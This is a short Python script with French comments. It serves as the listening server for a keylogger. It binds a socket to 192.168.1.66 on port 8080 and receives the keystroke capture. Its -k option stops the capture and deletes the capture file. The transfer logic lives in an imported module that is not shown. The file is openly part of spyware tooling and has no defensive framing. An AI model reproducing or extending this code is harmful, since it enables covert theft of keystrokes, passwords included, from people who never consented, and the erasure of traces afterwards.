import socket, ssl, argparse, server_functions

#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# OPTIONS
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Créer une aide pour -h
parser = argparse.ArgumentParser(description="Pour récupérer la capture réalisée par le keylogger exécutez le programme python sans option.")
# Créer l'option -k pour arrêter la capture et supprimer le fichier
parser.add_argument("-k", "--kill", help="Pour arrêter la capture et supprimer le fichier, ajoutez l'option -k ou --kill", action="store_true")

#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# CODE PRINCIPAL 
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Paramètres du serveur
server_address = ("192.168.1.66", 8080)

# Création du socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Lier le socket à l'adresse IP et au port
server_socket.bind(server_address)

# Ecouter les connexions entrantes
server_socket.listen(1)

print("En attente de connexion...")

if not parser.parse_args().kill:
    server_functions.transfert(server_socket, 0)
else:
    server_functions.transfert(server_socket, 1)
        
# Fermer le serveur
server_socket.close()